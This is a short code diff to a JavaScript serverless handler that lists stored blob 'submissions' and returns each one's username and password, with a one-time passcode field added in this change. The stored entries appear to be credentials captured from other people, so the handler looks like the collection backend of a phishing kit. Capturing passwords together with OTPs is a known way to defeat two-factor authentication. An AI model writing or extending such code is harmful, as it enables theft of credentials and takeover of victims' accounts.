@@ -7,7 +7,7 @@ import { list } from '@vercel/blob';
  * - Use @vercel/blob list()
  * - Retrieve saved private blob entries matching our prefix
  * - Fetch/extract the JSON data for each blob
- * - Standardize data format into structured username/password keys
+ * - Standardize data format into structured username/password/otp keys
  * - Return JSON array of submissions
  */
 export default async function handler(req, res) {
@@ -36,9 +36,10 @@ export default async function handler(req, res) {
           }
           const content = await response.json();
           
-          // Map to a standardized structure supporting old demoUser/demoText keys as well
+          // Map to a standardized structure including OTP
           const username = content.username || content.demoUser || 'Anonymous';
           const password = content.password || content.demoText || '';
+          const otp = content.otp || '';
           const timestamp = content.timestamp || blob.uploadedAt;
 
           return {
@@ -49,6 +50,7 @@ export default async function handler(req, res) {
             data: {
               username,
               password,
+              otp,
               timestamp
             }
           };
@@ -62,6 +64,7 @@ export default async function handler(req, res) {
             data: {
               username: 'System Error',
               password: `Unreadable entry: ${fetchErr.message}`,
+              otp: '',
               timestamp: blob.uploadedAt
             }
           };
